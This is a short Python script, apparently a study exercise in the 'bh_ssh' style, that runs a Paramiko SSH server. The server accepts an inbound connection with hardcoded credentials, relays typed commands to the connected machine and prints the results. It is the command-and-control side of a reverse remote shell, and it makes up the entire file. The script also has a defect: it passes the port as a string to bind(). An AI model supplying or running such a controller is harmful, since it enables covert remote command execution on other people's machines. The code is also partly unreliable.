#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Sep 30 22:46:57 2019

@author: max
"""

import socket
import threading
import paramiko
import sys

# Usando a chave dos arquivos de demonstração do Paramiko
host_key = paramiko.RSAKey(filename='id.key')
class Server(paramiko.ServerInterface):
    
    def __init__(self):
        self.event = threading.Event()
    
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_auth_password(self, username, password):        
        if (username == 'max') and (password == 'lua123'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

server = sys.argv[1]
ssh_port = sys.argv[2]

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] listening for connections ...')
    client, addr = sock.accept()

except Exception as e:
    print('[-] Listen Failed: %s'%str(e))
    sys.exit(1)

print('[+] Got a connection!')

try:
    bhsession = paramiko.Transport(client)
    bhsession.add_server_key(host_key)
    
    server = Server()
    
    try:
        bhsession.start_server(server=server)
    except paramiko.SSHException as x:
        print('[-] SSH negociation failed : %s'%str(x))
        
    chan = bhsession.accept(10)
    print('[+] Authenticated!')
    print('%s\n'%chan.recv(1024).decode('UTF-8'))
    chan.send('welcome to bh_ssh')
    
    while True:
        try:        
            command = input('Enter command: ').strip('\n')
            if command != 'exit':
                chan.send(command)
                print('%s \n'%chan.recv(1024).decode('UTF-8'))
            else:
                chan.send('exit')
                print('exitting')
                bhsession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhsession.close()
except Exception as e:
    print('[-] Caught exception: %s'%str(e))
    try:
        bhsession.close()
    except:
        pass
    
# =============================================================================
#     sys.exit()
# =============================================================================
            